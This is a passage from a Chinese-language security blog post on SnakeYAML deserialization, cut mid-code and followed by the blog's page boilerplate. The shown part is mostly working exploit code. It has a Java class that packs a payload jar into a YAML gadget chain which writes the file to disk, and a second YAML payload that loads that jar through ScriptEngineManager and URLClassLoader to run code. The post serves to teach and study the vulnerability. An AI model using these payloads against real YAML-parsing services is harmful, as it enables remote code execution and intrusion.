+<span class="hljs-keyword">import</span> java.util.zip.Deflater;
+
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SnakeYamlOffInternet</span> &#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String [] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;
+        <span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> createPoC(<span class="hljs-string">&quot;C:/Users/ga&#x27;t&#x27;c/Desktop/临时/yaml-payload-master/yaml-payload.jar&quot;</span>,<span class="hljs-string">&quot;./yaml.jar&quot;</span>);
+        <span class="hljs-type">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>();
+        yaml.load(poc);
+
+    &#125;
+
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">createPoC</span><span class="hljs-params">(String SrcPath,String Destpath)</span> <span class="hljs-keyword">throws</span> Exception &#123;
+        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(SrcPath);
+        <span class="hljs-type">Long</span> <span class="hljs-variable">FileLength</span> <span class="hljs-operator">=</span> file.length();
+        <span class="hljs-type">byte</span>[] FileContent = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[FileLength.intValue()];
+        <span class="hljs-keyword">try</span>&#123;
+            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file);
+            in.read(FileContent);
+            in.close();
+        &#125;
+        <span class="hljs-keyword">catch</span> (FileNotFoundException e)&#123;
+            e.printStackTrace();
+        &#125;
+        <span class="hljs-type">byte</span>[] compressbytes = compress(FileContent);
+        <span class="hljs-type">String</span> <span class="hljs-variable">base64str</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(compressbytes);
+        <span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File [\&quot;&quot;</span>+Destpath+<span class="hljs-string">&quot;\&quot;],false],!!java.util.zip.Inflater  &#123; input: !!binary &quot;</span>+base64str+<span class="hljs-string">&quot; &#125;,1048576]]&quot;</span>;
+        System.out.println(poc);
+        <span class="hljs-keyword">return</span> poc;
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] compress(<span class="hljs-type">byte</span>[] data) &#123;
+        <span class="hljs-type">byte</span>[] output = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">0</span>];
+
+        <span class="hljs-type">Deflater</span> <span class="hljs-variable">compresser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Deflater</span>();
+
+        compresser.reset();
+        compresser.setInput(data);
+        compresser.finish();
+        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>(data.length);
+        <span class="hljs-keyword">try</span> &#123;
+            <span class="hljs-type">byte</span>[] buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];
+            <span class="hljs-keyword">while</span> (!compresser.finished()) &#123;
+                <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> compresser.deflate(buf);
+                bos.write(buf, <span class="hljs-number">0</span>, i);
+            &#125;
+            output = bos.toByteArray();
+        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;
+            output = data;
+            e.printStackTrace();
+        &#125; <span class="hljs-keyword">finally</span> &#123;
+            <span class="hljs-keyword">try</span> &#123;
+                bos.close();
+            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;
+                e.printStackTrace();
+            &#125;
+        &#125;
+        compresser.end();
+        <span class="hljs-keyword">return</span> output;
+    &#125;
+&#125;</code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs erlang-repl">!!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File [<span class="hljs-string">&quot;Destpath&quot;</span>],false],!!java.util.zip.Inflater  &#123; input: !!binary base64str &#125;,<span class="hljs-number">1048576</span>]]</code></pre></div>
+
+<p>结果替换input，生成jar包</p>
+<p>最后URLClassLoader加载本地jar包</p>
+<div class="code-wrapper"><pre><code class="hljs wren"><span class="hljs-keyword">import</span> <span class="hljs-variable">org</span>.<span class="hljs-property">yaml</span>.<span class="hljs-property">snakeyaml</span>.<span class="hljs-property">Yaml</span>;
+
+<span class="hljs-variable">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">snaketest</span> &#123;
+    <span class="hljs-variable">public</span> <span class="hljs-keyword">static</span> <span class="hljs-variable">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">String</span>[] <span class="hljs-params">args</span>) &#123;
+        <span class="hljs-title class_">String</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!javax.script.ScriptEngineManager [<span class="hljs-char escape_">\n</span>&quot;</span> <span class="hljs-operator">+</span>
+                <span class="hljs-string">&quot;  !!java.net.URLClassLoader [[<span class="hljs-char escape_">\n</span>&quot;</span> <span class="hljs-operator">+</span>
+                <span class="hljs-string">&quot;    !!java.net.URL [<span class="hljs-char escape_">\&quot;</span>file://yaml.jar<span class="hljs-char escape_">\&quot;</span>]<span class="hljs-char escape_">\n</span>&quot;</span> <span class="hljs-operator">+</span>
+                <span class="hljs-string">&quot;  ]]<span class="hljs-char escape_">\n</span>&quot;</span> <span class="hljs-operator">+</span>
+                <span class="hljs-string">&quot;]&quot;</span>;
+        <span class="hljs-title class_">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-variable">new</span> <span class="hljs-title class_">Yaml</span>();
+        <span class="hljs-variable">yaml</span>.<span class="hljs-property">load</span>(<span class="hljs-variable">context</span>);
+    &#125;
+
+&#125;</code></pre></div>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>SnakeYaml反序列化</div>
+      <div>https://zer0peach.github.io/2023/11/05/SnakeYaml反序列化/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Zer0peach</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年11月5日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/11/11/docker/" title="docker">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">docker</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/11/03/mysql/" title="mysql">
+                        <span class="hidden-mobile">mysql</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <a href="https://zer0peach.github.io"><span>author:Zer0peach</span></a> 
+    </div>
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      京ICP证123456号
+    </a>
+  </span>
+  
+    
+      <span>
+        <a
+          href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=12345678"
+          rel="nofollow noopener"
+          class="beian-police"
+          target="_blank"
+        >
+          
+            <span style="visibility: hidden; width: 0">|</span>
+            <img src="/img/police_beian.png" srcset="/img/loading.gif" lazyload alt="police-icon"/>
+          
+          <span>京公网安备12345678号</span>
+        </a>
+      </span>
+    
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
